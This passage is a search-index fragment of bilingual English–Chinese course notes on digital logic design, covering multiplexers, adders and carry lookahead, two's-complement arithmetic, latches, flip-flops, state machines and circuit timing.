Enable.</p>"},{"location":"cs/computer_logic/chapter3/#2-to-1-line-multiplexer","title":"2-to-1-line Multiplexer","text":""},{"location":"cs/computer_logic/chapter3/#4-to-1-line-multiplexer","title":"4-to-1-line Multiplexer","text":""},{"location":"cs/computer_logic/chapter3/#multiplexer-width-expansion","title":"Multiplexer Width Expansion","text":"<p>Select \"vector bits\" instead of \"bits\".</p>"},{"location":"cs/computer_logic/chapter3/#other-multiplexers","title":"Other Multiplexers","text":"<p>Use three-state drivers.</p>"},{"location":"cs/computer_logic/chapter3/#combinational-logic-implementation","title":"Combinational Logic Implementation","text":""},{"location":"cs/computer_logic/chapter3/#multiplexer-approach-1","title":"Multiplexer Approach 1","text":"<p>n inputs, m outputs</p> <p>Use m-width \\(2^n\\)-to-1-line multiplexer</p> <p>Gray to Binary Code</p> <ul> <li> <p>Truth table:</p> <p></p> </li> <li> <p>Mux:</p> <p></p> </li> </ul>"},{"location":"cs/computer_logic/chapter3/#multiplexer-approach-2","title":"Multiplexer Approach 2","text":"<p>n + 1 inputs, m outputs</p> <p>Use m-width \\(2^n\\)-to-1-line multiplexer.</p> <p>Design:</p> <ul> <li>Find the truth table for the function.</li> <li>Based on the values of the first n variables, separate the truth table rows into pairs. \u6839\u636e\u524d n \u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u5c06\u771f\u503c\u8868\u5206\u6210\u4e24\u884c\u4e00\u5bf9\u3002</li> <li>For each pair and output, define a rudimentary function of the final variable \\((0, 1, X, \\bar X)\\)</li> <li>Use the first n variables as the select inputs of a multiplexer and the rudimentary functions as the data inputs.</li> </ul> <p>Gray to Binary Code</p> <ul> <li> <p>Truth table:</p> <p></p> </li> <li> <p>Mux:</p> <p></p> </li> </ul>"},{"location":"cs/computer_logic/chapter3/#design-procedure","title":"Design Procedure","text":""},{"location":"cs/computer_logic/chapter3/#combinational-circuits","title":"Combinational Circuits","text":"<p>\u8f93\u5165\u4e0e\u8f93\u51fa\u4e25\u683c\u5bf9\u5e94</p>"},{"location":"cs/computer_logic/chapter3/#beginning-hierarchical-design","title":"Beginning Hierarchical Design","text":"<ul> <li>Top-Down: \u4ece\u9876\u5c42\u5f00\u59cb\u8bbe\u8ba1\uff0c\u9010\u6b65\u7ec6\u5316</li> <li>Bottom-Up: \u4ece\u6700\u5e95\u5c42\u5f00\u59cb\u8bbe\u8ba1\uff0c\u9010\u6b65\u5408\u5e76</li> </ul>"},{"location":"cs/computer_logic/chapter3/#design-procedure_1","title":"Design Procedure","text":"<ul> <li>Specification \u7b80\u5316</li> <li> <p>Formulation \u516c\u5f0f\u5316</p> <p>Derive a truth table or initial Boolean equations for each output function.</p> <p>Apply hierarchical design to the output functions.</p> </li> <li> <p>Optimization \u4f18\u5316</p> <p>Apply multiple-level logic optimization to the output functions.</p> <p>Draw logic diagrams.</p> </li> <li> <p>Technology Mapping \u6280\u672f\u6620\u5c04</p> <p>Map the logic diagrams into a specific technology.</p> </li> <li> <p>Verification \u9a8c\u8bc1</p> <p>Verify the design by simulation.</p> </li> </ul> <p>Design BCD to Excess-3 Code Converter</p> <ul> <li> <p>Specification</p> <ul> <li>BCD code words for digits 0 through 9 are 0000 through 1001, respectively.</li> <li>Excess-3 code words for digits 0 through 9 consisting of 3 added to the BCD code words.</li> </ul> </li> <li> <p>Formulation</p> <p>write truth table (A-F \u65e0\u5173\u9879)</p> <p>Input BCD: ABCD, Output Excess-3: WXYZ</p> </li> <li> <p>Optimization</p> <ol> <li> <p>Use K-maps:</p> \\[\\begin{align} W &amp;= A + BC + BD \\\\ X &amp;= \\bar BC + \\bar BD + B\\bar C\\bar D \\\\ Y &amp;= CD + \\bar C \\bar D \\\\ Z &amp;= \\bar D \\end{align}\\] <p>G = 23</p> </li> <li> <p>Multiple-level logic optimization</p> <p>\\(T_1 = C + D\\), then</p> \\[\\begin{align} T_1 = C + D , G &amp;&amp;= 2 \\\\ \\bar T_1 , G &amp;&amp;= 1 \\\\ W &amp;= A + B(T_1) , G &amp;&amp;= 4 \\\\ X &amp;= \\bar B(T_1) + B\\bar T_1 , G &amp;&amp;= 6  \\\\ Y &amp;= CD + \\bar T_1 , G &amp;&amp;= 4 \\\\ Z &amp;= \\bar D, G &amp;&amp;= 0 \\end{align}\\] <p>G = 17</p> </li> <li> <p>Technology mapping</p> <p>Convert to NAND gates or NOR gates.</p> </li> </ol> </li> </ul>"},{"location":"cs/computer_logic/chapter3/#chip-design-styles","title":"Chip Design Styles","text":"<ul> <li> <p>Full custom: \u4e3a\u7279\u5b9a\u5e94\u7528\u8bbe\u8ba1</p> <p>\u4f18\u70b9\uff1a\u6700\u5c0f\u9762\u79ef\uff0c\u6700\u5feb\u901f\u5ea6\uff0c\u751f\u4ea7\u6210\u672c\u4f4e</p> <p>\u7f3a\u70b9\uff1a\u8bbe\u8ba1\u5468\u671f\u957f\uff0c\u8bbe\u8ba1\u6210\u672c\u9ad8</p> </li> <li> <p>Standard cell: \u5305\u542b\u6807\u51c6\u6a21\u5757\uff08\u7c7b\u4f3c\u6807\u51c6\u5e93\uff09</p> <p>\u4f18\u70b9\uff1a\u8bbe\u8ba1\u5468\u671f\u77ed\uff0c\u8bbe\u8ba1\u6210\u672c\u4f4e</p> <p>\u7f3a\u70b9\uff1a\u9762\u79ef\u5927\uff0c\u901f\u5ea6\u6162\uff0c\u751f\u4ea7\u6210\u672c\u9ad8</p> </li> <li> <p>Gate array: \u95e8\u9635\u5217\uff08\u53ef\u7f16\u7a0b\uff09</p> <p>\u4f18\u70b9\uff1a\u6210\u672c\u6700\u4f4e</p> <p>\u7f3a\u70b9\uff1a\u9762\u79ef\u5927\uff0c\u901f\u5ea6\u6162</p> </li> </ul>"},{"location":"cs/computer_logic/chapter3/#cell-libraries","title":"Cell Libraries","text":"<ul> <li>Cell: pre-designed logic block</li> <li>Cell library: a collection of cells</li> <li>Cell characterization: a detailed specification of the cell for use.</li> </ul> <p>Cell Library</p> <p></p>"},{"location":"cs/computer_logic/chapter3/#mapping-to-nand-gate","title":"Mapping to NAND gate","text":"<p>Convert any circuits to NAND gates.</p> <p>Assumptions</p> <ul> <li>Gate loading and delay are ignored.</li> <li>\u53ef\u4ee5\u7528\u4efb\u610f\u591a\u8f93\u5165\u7684 NAND \u95e8</li> </ul> <ol> <li> <p>Convert AND and OR gates to NAND gates</p> <ul> <li>\\(A + B = \\overline{\\overline{A + B}} = \\overline{\\bar A \\bar B}\\)</li> <li>\\(AB = \\overline{\\overline{AB}}\\)</li> </ul> </li> <li> <p>Pushing inverters through circuit fan-out points</p> </li> </ol> <p>Mapping to NOR is similar.</p>"},{"location":"cs/computer_logic/chapter3/#verificaiton","title":"Verificaiton","text":"<ul> <li> <p>Manual Logic Analysis (Simple Circuits)</p> <ul> <li>Write a truth table.</li> <li>Derive Boolean equations.</li> </ul> </li> <li> <p>Simulation</p> <ol> <li>Write a test program.</li> <li>Simulate the circuit.</li> </ol> <p>apply all possible input combinations or important input combinations</p> </li> </ul>"},{"location":"cs/computer_logic/chapter3/#arithmetic-functions","title":"Arithmetic Functions","text":""},{"location":"cs/computer_logic/chapter3/#iterative-combinational-circuits","title":"Iterative Combinational Circuits","text":"<p>Use blocked diagram to process each bit.</p>"},{"location":"cs/computer_logic/chapter3/#half-adder","title":"Half Adder","text":"<p>inputs: \\(X, Y\\); outputs: \\(S, C\\) (sum, carry)</p> \\[\\begin{align} S &amp;= A \\oplus B \\\\ C &amp;= AB \\end{align}\\]"},{"location":"cs/computer_logic/chapter3/#full-adder","title":"Full Adder","text":"<p>inputs: \\(X, Y, Z\\) (\\(Z\\): carry); outputs: \\(S, C\\)</p> \\[\\begin{align} S &amp;= X \\oplus Y \\oplus Z \\\\ C &amp;= XY + XZ + YZ = XY + (X \\oplus Y)Z \\end{align}\\] <p>Implement:</p> \\[\\begin{align} G = XY, P = X \\oplus Y \\\\ S = P \\oplus Z, C = G + PZ \\end{align}\\]"},{"location":"cs/computer_logic/chapter3/#4-bit-ripple-carry-adder","title":"4-bit Ripple-Carry Adder","text":"<p>\u7f3a\u70b9\uff1a\u5ef6\u8fdf\u9ad8\uff08Carry \u9700\u8981\u4f20\u9012\uff09</p> <p>Carry Lookahead</p> <p>\\(P_i = X_i \\oplus Y_i, G_i = X_iY_i\\)</p> <p>\\(C_4 = G_3 + P_3G_2 + P_3P_2G_1 + P_3P_2P_1G_0 + P_3P_2P_1P_0C_0\\)</p> <p>\u7f3a\u70b9\uff1a\u95e8\u8f93\u5165\u6210\u672c\u5927\u3001\u6247\u51fa\u7cfb\u6570\u5927\u5bfc\u81f4\u5ef6\u8fdf\u9ad8\uff0c\u968f\u7740\u4f4d\u6570\u589e\u52a0\uff0c\u6210\u672c\u5927\u5927\u589e\u52a0</p> <p>Group Carry Lookahead Logic</p> <p>16-bit adder: 4 groups</p> \\[\\begin{align} G_{0\\sim 3} &amp;= G_3 + P_3G_2 + P_3P_2G_1 + P_3P_2P_1G_0 \\\\ P_{0\\sim 3} &amp;= P_3P_2P_1P_0 \\end{align}\\] <p></p> <p>CLA: input \\(G_0, P_0, G_1, P_1, G_2, P_2, G_3, P_3\\), output \\(G_{0\\sim 3}, P_{0\\sim 3}\\)</p> <p></p> <p>\u7b2c\u4e00\u5c42\u6700\u53f3 CLA: input \\(G_0, P_0, G_1, P_1, G_2, P_2, G_3, P_3\\), output \\(G_{0\\sim 3}, P_{0\\sim 3}\\)</p> <p>\u7b2c\u4e8c\u5c42 CLA: input \\(C_0, G_{0\\sim 3}, P_{0\\sim 3}, G_{4\\sim 7}, P_{4\\sim 7}, G_{8\\sim 11}, P_{8\\sim 11}, G_{12\\sim 15}, P_{12\\sim 15}\\), output \\(C_4, C_8, C_{12}, C_{16}\\)</p> <p>Longest Delays:</p> <p>\\(A_0, B_0 \\to CLA \\to G_0, P_0 \\to CLA \\to C_{12} \\to CLA \\to C_{16}\\)</p>"},{"location":"cs/computer_logic/chapter3/#unsigned-subtraction","title":"Unsigned Subtraction","text":"<p>Note</p> <p>compute: \\(N - M\\)</p> <ul> <li>\\(N \\geq M\\): \u65e0\u501f\u4f4d</li> <li>\\(N &lt; M\\): \\(N - M = -(2^n - (M - N))\\) \u6700\u9ad8\u4f4d\u501f\u4f4d</li> </ul> <p>\u4e00\u822c\u4e0d\u7528\u8fd9\u79cd\u65b9\u6cd5\u3002</p> <p>2's Complements:</p> <ul> <li>Diminished Radix Complement (DRC) \u53cd\u7801 \\(2^n - M - 1\\)</li> <li>Radix Complement (RC) \u8865\u7801 \\(2^n - M\\)</li> </ul> <p>\\(M - N = M + (2^n - N)\\) (n-bit)</p> <ul> <li>\\(M \\geq N\\): \\(2^n\\) \u6ea2\u51fa\uff0c\\(M - N\\) \u4fdd\u7559</li> <li>\\(M &lt; N\\): \u7ed3\u679c\u4e3a\u8d1f\u6570\uff0c\u6c42\u5f97\u8865\u7801\u3002</li> </ul> <p>\u5982\u679c\u6709\u8fdb\u4f4d\uff0c\u5219\u8bf4\u660e\u7ed3\u679c\u4e3a\u6b63\u6570\uff0c\u65e0\u501f\u4f4d\uff1b\u5426\u5219\u7ed3\u679c\u4e3a\u8d1f\u6570\uff0c\u6709\u501f\u4f4d\u3002</p>"},{"location":"cs/computer_logic/chapter3/#signed-integer","title":"Signed Integer","text":"<p>\u6700\u9ad8\u4f4d\u662f\u7b26\u53f7\u4f4d\uff0c0 \u8868\u793a\u6b63\u6570\uff0c1 \u8868\u793a\u8d1f\u6570\u3002\u4e00\u822c\u91c7\u7528 2's Complements \u5373\u7b26\u53f7\u4f4d+\u8865\u7801\u3002</p> <p>\u7535\u8def\u4e2d\u7684\u5b9e\u73b0</p> <ul> <li>\u52a0\u6cd5\uff1a\u76f4\u63a5\u76f8\u52a0</li> <li>\u51cf\u6cd5\uff1a\u5c06\u51cf\u6570\u53d6\u53cd\u52a0\u4e00\uff08\u53d8\u4e3a\u51cf\u6570\u53d6\u53cd\u4e4b\u540e\u7684\u8865\u7801\uff09\uff0c\u518d\u4e0e\u88ab\u51cf\u6570\u76f8\u52a0</li> </ul> <p></p>"},{"location":"cs/computer_logic/chapter3/#overflow-detection","title":"Overflow Detection","text":"<p>\u901a\u8fc7\u7b26\u53f7\u4f4d\u5224\u65ad\u6ea2\u51fa\uff0c\u6709 8 \u79cd\u60c5\u51b5\uff1a</p> <ul> <li> <p>\u65e0\u6ea2\u51fa</p> <p></p> </li> <li> <p>\u6709\u6ea2\u51fa</p> <p></p> </li> </ul> <p>\uff08\u6ce8\uff1a\u51cf\u8d1f\u6570\u76f8\u5f53\u4e8e\u52a0\u6b63\u6570\uff0c\\(C_{n-1}\\) \u4e3a 0\uff1b\u52a0\u8d1f\u6570\u76f8\u5f53\u4e8e\u51cf\u6b63\u6570\uff0c\\(C_{n-1}\\) \u4e3a 1\uff09</p> <p>\u5f97\u5230\u6ea2\u51fa\u5224\u65ad\u516c\u5f0f\uff1a\\(V = C_{n-1} \\oplus C_{n}\\)\uff0c\u8fd9\u91cc \\(C_{n}\\) \u4e3a\u7ed3\u679c\u7684\u7b26\u53f7\u4f4d\u3002</p>"},{"location":"cs/computer_logic/chapter3/#other-arithmetic-functions","title":"Other Arithmetic Functions","text":"<ul> <li> <p>Incrementer</p> <ul> <li>Adding a fixed value to an arithmetic variable</li> <li>fixec value = 1, called counting up</li> <li>Functional block is called an incrementer</li> </ul> </li> <li> <p>Decrementer</p> <ul> <li>Subtracting a fixed value from an arithmetic variable</li> <li>fixec value = 1, called counting down</li> <li>Functional block is called a decrementer</li> </ul> </li> <li> <p>Multiplier by a Constant: shift left</p> </li> <li>Divider by a Constant: shift right</li> <li> <p>Zero Fill and Extension</p> <ul> <li>Zero fill: add 0s to the MSB or LSB</li> <li>Extension: add 0s or 1s to the MSB to extend the length of the variable (usually copy the sign bit)</li> </ul> </li> </ul> <p>A + 1 Incrementer</p> <p></p>"},{"location":"cs/computer_logic/chapter3/#arithmetic-logic-unit-alu","title":"Arithmetic Logic Unit (ALU)","text":"<p>Decompose the arithmetic circuit into:</p> <ul> <li>An n-bit parallel adder</li> <li>A block of logic that selects four choices for the B input of the adder</li> </ul>"},{"location":"cs/computer_logic/chapter4/","title":"Sequential Circuits","text":""},{"location":"cs/computer_logic/chapter4/#storage-elements-and-analysis","title":"Storage Elements and Analysis","text":""},{"location":"cs/computer_logic/chapter4/#introduction-to-sequential-circuits","title":"Introduction to Sequential Circuits","text":"<p>A Sequential circuit contains:</p> <ul> <li>Storage elements: Latches or Flip-Flops </li> <li> <p>Combinational Logic:</p> <ul> <li>Implements a multiple-output switching function</li> <li>Inputs are signals from the outside.</li> <li>Outputs are signals to the outside.</li> <li>Other inputs, State or Present State, are signals from storage elements. </li> <li>The remaining outputs, Next State are inputs to storage elements. </li> </ul> </li> </ul> <p>Combinatorial Logic:</p> <ul> <li>Next state function \u6b21\u6001\u65b9\u7a0b: Next State = f(Inputs, State)</li> <li>Output function (Mealy \u6a21\u578b): Outputs = g(Inputs, State)</li> <li>Output function (Moore \u6a21\u578b): Outputs = h(State)</li> </ul> <p>Output function type depends on specification and affects the design significantly</p>"},{"location":"cs/computer_logic/chapter4/#types-of-sequential-circuits","title":"Types of Sequential Circuits","text":"<ul> <li> <p>Synchronous \u540c\u6b65</p> <ul> <li>Behavior defined from knowledge of its signals at discrete instances of time</li> <li>Storage elements observe inputs and can change state only in relation to a timing signal (clock pulses from a clock)</li> </ul> <p>\u6240\u6709\u5143\u4ef6\u540c\u6b65\u66f4\u65b0\uff0c\u5728\u65f6\u949f\u5468\u671f\u5185\u66f4\u65b0\u3002\u6709\u5229\u4e8e\u5206\u6790\u548c\u8bbe\u8ba1\u3002</p> </li> <li> <p>Asynchronous \u5f02\u6b65</p> <ul> <li>Behavior defined from knowledge of inputs an any instant of time and the order in continuous time in which inputs change</li> <li>If clock just regarded as another input, all circuits are asynchronous. \u5982\u679c\u65f6\u949f\u4e5f\u88ab\u770b\u505a\u4e00\u4e2a\u8f93\u5165\uff0c\u90a3\u4e48\u6240\u6709\u7535\u8def\u90fd\u662f Asynchronous</li> </ul> <p>\u72b6\u6001\u66f4\u65b0\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u95f4\u53d1\u751f\u3002\u53ef\u4ee5\u6709\u9700\u8981\u7684\u65f6\u5019\u66f4\u65b0\u7535\u8def\uff0c\u964d\u4f4e\u7535\u8def\u7684\u529f\u8017\u3002</p> </li> </ul>"},{"location":"cs/computer_logic/chapter4/#discrete-event-simulation","title":"Discrete Event Simulation \u79bb\u6563\u4e8b\u4ef6\u4eff\u771f","text":"<p>In order to understand the time behavior of a sequential circuit.</p> <p>Gates modeled by an ideal (instantaneous) function and a fixed gate delay. \u6240\u6709\u95e8\u7684\u5ef6\u8fdf\u90fd\u662f\u56fa\u5b9a\u7684\uff0c\u62bd\u8c61\u6210\u7406\u60f3\u7535\u8def\u95e8\u548c\u56fa\u5b9a\u5ef6\u8fdf\u3002</p>"},{"location":"cs/computer_logic/chapter4/#latch","title":"Latch","text":""},{"location":"cs/computer_logic/chapter4/#basic-nand-sr-latch","title":"Basic (NAND) SR Latch","text":"<p>\u5f53 \\(S = R = 1\\) \u65f6\uff0c\u9501\u5b58\u5668\u5c06\u4fdd\u6301\u539f\u6765\u7684\u72b6\u6001\u3002</p> <p>\u5f53 \\(S = 0, R = 0\\) \u65f6\uff0c\u9501\u5b58\u5668\u7684\u72b6\u6001\u672a\u5b9a\u4e49\u3002</p> <p>\u5176\u4f59\u7ec4\u5408\uff0c\u6709 \\(Q = \\bar S\\)\u3002</p> <p>\u8fd9\u79cd\u5b9e\u73b0\u88ab\u79f0\u4f5c \\(\\bar S-\\bar R\\) latch\u3002</p>"},{"location":"cs/computer_logic/chapter4/#basic-nor-sr-latch","title":"Basic (NOR) SR Latch","text":"<p>\u548c NAND SR Latch \u76f8\u53cd\u3002</p>"},{"location":"cs/computer_logic/chapter4/#clocked-sr-latch","title":"Clocked SR Latch","text":"<p>\u5f53 \\(C = 0\\) \u65f6\uff0c\u9501\u5b58\u5668\u4fdd\u6301\u539f\u6765\u7684\u72b6\u6001\uff0c\u5373\u540e\u9762\u7684 \\(\\bar S-\\bar R\\) latch \u5904\u4e8e\u9501\u5b9a\u72b6\u6001\u3002</p> <p>\u5f53 \\(C = 1\\) \u65f6\uff0c\u9501\u5b58\u5668\u7684\u72b6\u6001\u7531 SR latch \u51b3\u5b9a\u3002</p>"},{"location":"cs/computer_logic/chapter4/#d-latch","title":"D Latch","text":"<p>\u6d88\u9664\u4e86\u4e0d\u786e\u5b9a\u72b6\u6001\uff0c\\(C\\) \u63a7\u5236\u9501\u5b58\uff0c\\(D\\) \u63a7\u5236\u8f93\u51fa\u3002\\(C = 1\\) \u65f6 \\(Q = D\\)\u3002</p> <p>Info</p> <p>\u5728\u7b97\u95e8\u8f93\u5165\u6210\u672c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u8981\u5206\u5f00\u7b97 G \u548c GN. \u56e0\u4e3a\u9501\u5b58\u5668\u540c\u65f6\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86 \\(Q\\) \u548c \\(\\bar Q\\)\uff0c\u9501\u5b58\u5668\u53ef\u4ee5\u4e3a\u540e\u9762\u7684\u7ec4\u5408\u7535\u8def\u63d0\u4f9b\u539f\u53d8\u91cf\u548c\u53cd\u53d8\u91cf\u3002</p> <p>The Latch Timing Problem</p> <p>For a clocked D-latch, the output Q depends on the input D whenever the clock input C has value 1.</p> <p>\u9501\u5b58\u5668\u65e0\u6cd5\u505a\u5230\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5185\u53ea\u66f4\u65b0\u4e00\u6b21\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u5c06\u9501\u5b58\u5668\u7684\u8f93\u5165\u548c\u8f93\u51fa\u5206\u5f00\uff0c\u4f7f\u8f93\u5165\u4e0d\u80fd\u76f4\u63a5\u4f5c\u7528\u5728\u8f93\u51fa\u4e0a\u3002</p>"},{"location":"cs/computer_logic/chapter4/#flip-flops","title":"Flip-Flops","text":""},{"location":"cs/computer_logic/chapter4/#sr-master-slave-flip-flop","title":"SR Master-Slave Flip-Flop","text":"<p>\u524d\u9762\u7684\u9501\u5b58\u5668\u79f0\u4e3a Master\uff0c\u540e\u9762\u7684\u9501\u5b58\u5668\u79f0\u4e3a Slave\u3002</p> <p>\u5f53 \\(C = 0\\) \u65f6\uff0cMaster \u9501\u5b58\u5668\u4e0d\u53d8\u3002</p> <p>\u5f53 \\(C = 1\\) \u65f6\uff0cMaster \u9501\u5b58\u5668\u7684\u72b6\u6001\u7531 SR latch \u51b3\u5b9a\uff0cSlave \u9501\u5b58\u5668\u88ab\u9501\u5b9a\u3002</p> <p>\u5f53 \\(C\\) \u4ece 1 \u53d8\u4e3a 0 \u65f6\uff0cMaster \u9501\u5b58\u5668\u7684\u72b6\u6001\u88ab\u9501\u5b9a\uff0cSlave \u9501\u5b58\u5668\u7684\u8f93\u5165\u63a5\u6536 Master \u9501\u5b58\u5668\u7684\u8f93\u51fa\uff0c\u72b6\u6001\u88ab\u6539\u53d8\u3002</p> <p>1s catching \u4e00\u6b21\u6027\u91c7\u6837\u95ee\u9898</p> <p>\u5f53 \\(C = 1\\) \u65f6\uff0c\u82e5 \\(S,R\\) \u51fa\u73b0\u5c0f\u6270\u52a8\uff0c\u4f46\u662f\u5728 \\(C\\) \u53d8\u4e3a 0 \u4e4b\u524d\u6062\u590d\uff0c\u90a3\u4e48 \\(Q\\) \u7684\u72b6\u6001\u5c06\u4f1a\u88ab\u6539\u53d8\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1aUse edge-triggering instead of master-slave \u4f7f\u7528\u8fb9\u6cbf\u89e6\u53d1\u4ee3\u66ff\u4e3b\u4ece\u9501\u5b58\u5668\u3002</p>"},{"location":"cs/computer_logic/chapter4/#edge-triggered-d-flip-flop","title":"Edge-Triggered D Flip-Flop","text":"<p>The delay of the S-R master-slave flip-flop can be avoided since the 1s-catching behavior is not present with D replacing S and R inputs.</p> <p>It is called a negative-edge triggered flip-flop, \u8d1f\u8fb9\u6cbf\u89e6\u53d1\u5668\u3002</p> <p>\u540c\u6837\u6709\u6b63\u8fb9\u6cbf\u89e6\u53d1\u5668\uff1a</p>"},{"location":"cs/computer_logic/chapter4/#actual-circuit-of-edge-triggered-d-flip-flop","title":"Actual Circuit of Edge-Triggered D Flip-Flop:","text":""},{"location":"cs/computer_logic/chapter4/#standard-symbols-for-storage-elements","title":"Standard Symbols for Storage Elements","text":"<p>Direct Inputs</p> <p>Direct R and/or S inputs that control the state of the latches within the flip-flops are used for initialization. \u76f4\u63a5\u8f93\u5165\u7684 R \u548c/\u6216 S \u7528\u4e8e\u521d\u59cb\u5316\u89e6\u53d1\u5668\u72b6\u6001\uff0c\u8fd9\u4e00\u64cd\u4f5c\u4e00\u822c\u662f\u5f02\u6b65\u7684\u3002</p> <p></p>"},{"location":"cs/computer_logic/chapter4/#sequential-circuit-analysis","title":"Sequential Circuit Analysis","text":"<p>General Model:</p> <ul> <li>Current State at time (t) is stored in an array of flip-flops.\u00a0</li> <li>Next State at time (t+1) is a Boolean function of State and Inputs.</li> <li>Outputs at time (t) are a Boolean function of State (t) and (sometimes) Inputs (t).</li> </ul> <p>Example</p> <p></p> <ul> <li>Current State: \\(A, B\\)</li> <li>Next State: \\(A(t+1) = AX + BX, B(t+1) = \\bar AX\\)</li> <li>Output: \\(Y = (A + B)\\bar X\\)</li> </ul>"},{"location":"cs/computer_logic/chapter4/#state-table","title":"State Table","text":"<p>A multiple variable table with the following four sections:</p> <ul> <li>Present State: the values of the state variables for each allowed state.</li> <li>Inputs: the input combinations allowed</li> <li>Next state: the value of the state at time (t+1) based on the present state and the input.</li> <li>Outputs: the value of the output as a function of the present state and (sometimes) the input.</li> </ul> <p>Example</p> <p>\u4e0a\u4e00\u4f8b\u4e2d\u7684\u7535\u8def\u56fe\u7684\u72b6\u6001\u8868\uff1a</p> <p></p> <p>\u6216\u8005\u5199\u6210\uff1a</p> <p></p>"},{"location":"cs/computer_logic/chapter4/#state-diagrams","title":"State Diagrams","text":"<p>The sequential circuit function can be represented in graphical form as a state diagram.</p> <p>Label form:</p> <ul> <li>On circle with output included:<ul> <li>state/output</li> <li>Moore type output depends only on state</li> </ul> </li> <li>On directed arc with the output included:<ul> <li>input/output</li> <li>Mealy type output depends on state and input</li> </ul> </li> </ul> <p>Example</p> <p></p> <p>Equivalent State Definitions</p> <p>Two states are equivalent if their outputs produced for each input symbol is identical and their next states for each input symbol are the same or equivalent.</p> <p>\u82e5\u4e24\u4e2a\u72b6\u6001\u63a5\u53d7\u76f8\u540c\u8f93\u5165\u540e\u8f93\u51fa\u76f8\u540c\uff0c\u4e14\u4e0b\u4e00\u4e2a\u72b6\u6001\u76f8\u540c\u6216\u7b49\u4ef7\uff0c\u5219\u4e24\u4e2a\u72b6\u6001\u7b49\u4ef7\u3002</p> Example <p></p> <p>\u56fe\u4e2d S1\u3001S2\u3001S3 \u7b49\u4ef7\uff0c\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u72b6\u6001\uff1a</p> <p></p>"},{"location":"cs/computer_logic/chapter4/#moore-and-mealy-models","title":"Moore and Mealy Models","text":"<p>Sequential Circuits or Sequential Machines are also called Finite State Machines (FSMs). Two formal models exist:</p> <ul> <li> <p>Moore Model: the outputs depend only on the present state.</p> <p>State Diagram \u4e2d\uff0c\u8f93\u51fa\u5199\u5728\u72b6\u6001\u8282\u70b9\u4e0a\u3002</p> </li> <li> <p>Mealy Model: the outputs depend on the present state and the inputs.</p> <p>State Diagram \u4e2d\uff0c\u8f93\u51fa\u5199\u5728\u72b6\u6001\u8f6c\u79fb\u8fb9\u4e0a\u3002</p> </li> </ul>"},{"location":"cs/computer_logic/chapter4/#flip-flop-timing-parameters","title":"Flip-Flop Timing Parameters","text":"<ul> <li>\\(t_s\\): setup time \u51c6\u5907\u65f6\u95f4\uff0c\u5728\u72b6\u6001\u8fdb\u884c\u66f4\u65b0\u4e4b\u524d\u9700\u8981\u51c6\u5907\u597d</li> <li>\\(t_h\\): hold time \u4e00\u822c\u4e3a 0\uff0c\u4fdd\u6301\u65f6\u95f4\uff0c\u5728\u72b6\u6001\u66f4\u65b0\u4e4b\u540e\u9700\u8981\u4fdd\u6301\u4e00\u6bb5\u65f6\u95f4</li> <li>\\(t_w\\): clock pulse width, usually \\(t_{wH} = t_{wL}\\)</li> <li>\\(t_{px}\\): propagation delay<ul> <li>\\(t_{PHL}\\): High-to-Low</li> <li>\\(t_{PLH}\\): Low-to-High</li> <li>\\(t_{pd}\\): \\(\\max(t_{PHL}, t_{PLH})\\) </li> </ul> </li> </ul>"},{"location":"cs/computer_logic/chapter4/#circuit-and-system-level-timing","title":"Circuit and System Level Timing","text":"<p>\u8ba1\u7b97\u89e6\u53d1\u5668\u4ece\u8f93\u51fa\u5230\u8f93\u5165\u7684\u5ef6\u8fdf\uff0c\u53ef\u4ee5\u5c06\u51fa\u53d1\u5668\u7684\u8f93\u51fa\u548c\u8f93\u5165\u62c6\u5f00\uff0c\u66f4\u52a0\u76f4\u89c2\u5730\u8ba1\u7b97\u5ef6\u8fdf\u3002</p> <p>If the clock period is too short, some data changes will not propagate through the circuit to flip-flop inputs before the setup time interval begins.</p> <p>New timing components:</p> <ul> <li>\\(t_p\\): clock period \u65f6\u949f\u5468\u671f</li> <li>\\(t_{pd,COMB}\\): total delay of combinational logic along the path from flip-flop output to flip-flop input</li> <li>\\(t_{slack}\\): extra time in the clock period in addition to the sum of the delays and setup time on a path </li> </ul> <p>\u964d\u4f4e\u5ef6\u8fdf\uff1a\u4e3b\u8981\u8003\u8651\u4f18\u5316 \\(t_{pd,COMB}\\)\uff0c\u51cf\u5c11\u7ec4\u5408\u903b\u8f91\u7684\u5ef6\u8fdf\u3002</p> <p>Time equation</p> \\[ t_p \\geq \\max(t_{pd,FF} + t_{pd,COMB} + t_s) \\] <p>for all paths from flip-flop output to flip-flop input.</p> <p>Example</p> <ul> <li>\\(t_{pd,FF} = 1.0 ns\\)</li> <li>\\(t_s = 0.3 ns\\) for edge-triggered flip-flops</li> <li>\\(t_s = t_{wH} = 2.0 ns\\) for master-slave flip-flops</li> <li>Clock frequency = 250 MHz</li> </ul> <p>Calculations:</p> <p>\\(t_p = 1 / 250 MHz = 4.0 ns\\)</p> <ul> <li> <p>Edge-triggered: \\(4.0 \\geq 1.0 + t_{pd,COMB} + 0.3 \\Rightarrow t_{pd,COMB} \\leq 2.7 ns\\)</p> <p>Approximately 9 gates allowed on a path</p> </li> <li> <p>Master-slave: \\(4.0 \\geq 1.0 + t_{pd,COMB} + 2.0 \\Rightarrow t_{pd,COMB} \\leq 1.0 ns\\)</p> <p>Approximately 3 gates allowed on a path</p> </li> </ul>"},{"location":"cs/computer_logic/chapter4/#sequential-circuit-design","title":"Sequential Circuit Design","text":"<p>The Design Procedure:</p> <ul> <li>Specification</li> <li>Formulation: Obtain a state diagram or state table</li> <li>State Assignment: Assign binary codes to the states</li> <li>Flip-Flop Input Equation Determination</li> <li>Output Equation Determination</li> <li>Optimization</li> <li>Technology Mapping</li> <li>Verification</li> </ul>"},{"location":"cs/computer_logic/chapter4/#specification","title":"Specification","text":"<p>Component Forms of Specification</p> <ul> <li>State Diagram</li> <li>State Equations</li> <li>HDL codes</li> <li>...</li> </ul>"},{"location":"cs/computer_logic/chapter4/#formulation","title":"Formulation","text":"<p>A state is an abstraction of the history of the past applied inputs to the circuit.</p> <p>\u89e6\u53d1\u5668\u6570\u91cf\u9009\u62e9\uff1a\\(n = \\lceil \\log_2 m \\rceil\\)\uff0c\\(m\\) \u4e3a\u72b6\u6001\u6570\u3002</p> 